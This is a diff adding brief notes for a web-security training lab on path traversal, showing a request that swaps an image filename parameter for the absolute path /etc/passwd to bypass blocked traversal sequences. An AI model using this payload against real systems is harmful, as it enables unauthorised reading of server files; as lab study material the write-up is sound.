@@ -1,0 +1,17 @@
+Lab #2: File path traversal, traversal sequences blocked with absolute path bypass
+
+
+Target: Get access to the content of /etc/passwd
+
+Analysis:
+
+The image files are loaded with Get request, but your traversal string is ineffective:
+
+GET /image?filename=72.jpg
+
+solution:
+send the request to the repeater and change the filename parameter using the exact path:
+
+GET /image?filename=/etc/passwd 
+
+
